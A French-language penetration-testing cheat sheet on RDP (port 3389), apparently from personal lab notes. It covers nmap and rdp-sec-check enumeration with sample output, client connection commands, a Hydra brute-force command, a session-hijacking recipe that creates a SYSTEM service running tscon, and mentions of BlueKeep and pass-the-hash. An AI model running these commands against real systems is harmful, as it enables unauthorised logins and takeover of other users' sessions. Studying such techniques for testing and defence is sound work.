---
public: true 
#Tags: tag1, tag2
---
Port : 3389/tcp

## Enumeration

### Nmap

```shell-session
nmap -sV -sC $TARGET_IP -p3389 --script rdp*

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Outil permettant d'identifier les paramètres de sécurité d'un serveur RDP sans s'authentifier
https://github.com/CiscoCXSecurity/rdp-sec-check

```
$ sudo cpan
cpan[1]> install Encoding::BER
```

### RDP Security Check

```shell-session
$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
$ ./rdp-sec-check.pl 10.129.201.248
[+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

[+] Checking supported protocols

[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Checking RDP Security Layer

[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

[+] Summary of protocol support

[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

[+] Summary of RDP encryption support

[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

[+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
```

## Connexion RDP depuis linux

Clients : `xfreerdp`, `rdesktop`, ou `Remmina`

 ```shell-session

xfreerdp /u:$AD_USER /p:$AD_PASSWORD /v:$TARGET_IP /drive:shareName,/tmp /size:1900x900 

rdesktop -u $AD_USER -p $AD_PASSWORD $TARGET_IP

```

## Attaques / Exploitations

### Exploits

- Bluekeep (fix en 2019)
 
### Brute force RDP avec Hydra
 ```
hydra -L user.list -P password.list rdp://$TARGET_IP
```

### RDP Session Hijacking

Objectif : basculer sur une session RDP d'une autre session RDP (sans saisie de mot de passe)
Prérequis : être administrateur local (pour pouvoir devenir SYSTEM)

```
# On récupère sa session active et celle que l'on souhaite hijacker
query user
 USERNAME              SESSIONNAME       ID  STATE   IDLE TIME  LOGON TIME
>attacker              rdp-tcp#1          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#2          2  Active          *  8/25/2021 1:28 AM

# Creation d'un service qui lancera TSCON.EXE en tant que SYSTEM
## tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"

# Lancement du service
net start sessionhijack
```

### RDP Pass the Hash

xfreerdp peut faire du PtH. Il est toutefois nécessaire de désactiver un mécanisme de sécurité via la base de registre.
Voir : [[Pass The Hash (PtH)]]
